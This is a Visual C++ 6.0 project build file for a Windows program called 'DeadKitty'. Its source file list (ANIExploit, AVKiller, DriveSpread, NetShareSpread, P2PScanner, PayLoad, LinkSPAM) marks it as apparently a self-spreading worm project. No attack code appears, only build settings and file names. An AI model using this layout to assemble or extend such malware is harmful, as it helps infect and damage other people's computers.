# Microsoft Developer Studio Project File - Name="DeadKitty" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=DeadKitty - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "DeadKitty.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "DeadKitty.mak" CFG="DeadKitty - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "DeadKitty - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD BASE RSC /l 0x410 /d "NDEBUG"
# ADD RSC /l 0x410 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib wsock32.lib advapi32.lib imagehlp.lib mpr.lib shell32.lib /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "DeadKitty - Win32 Release"
# Begin Source File

SOURCE=.\ZipStuff\adler32.c
# End Source File
# Begin Source File

SOURCE=.\ANIExploit.c
# End Source File
# Begin Source File

SOURCE=.\AVKiller.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\compress.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\crc32.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\crc32.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\crypt.h
# End Source File
# Begin Source File

SOURCE=.\DeadKitty.c
# End Source File
# Begin Source File

SOURCE=.\DeadKitty.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\deflate.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\deflate.h
# End Source File
# Begin Source File

SOURCE=.\DriveSpread.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\gzio.c
# End Source File
# Begin Source File

SOURCE=.\hello_kitty_rulez.rc
# End Source File
# Begin Source File

SOURCE=.\icon.ico
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\infback.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inffast.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inffast.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inffixed.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inflate.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inflate.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inftrees.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\inftrees.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\ioapi.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\ioapi.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\iowin32.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\iowin32.h
# End Source File
# Begin Source File

SOURCE=.\LinkSPAM.c
# End Source File
# Begin Source File

SOURCE=.\misc.c
# End Source File
# Begin Source File

SOURCE=.\NetShareSpread.c
# End Source File
# Begin Source File

SOURCE=.\P2PScanner.c
# End Source File
# Begin Source File

SOURCE=.\PayLoad.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\trees.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\trees.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\uncompr.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\unzip.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\unzip.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zconf.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zconf.in.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zip.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zip.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zlib.h
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zutil.c
# End Source File
# Begin Source File

SOURCE=.\ZipStuff\zutil.h
# End Source File
# End Target
# End Project
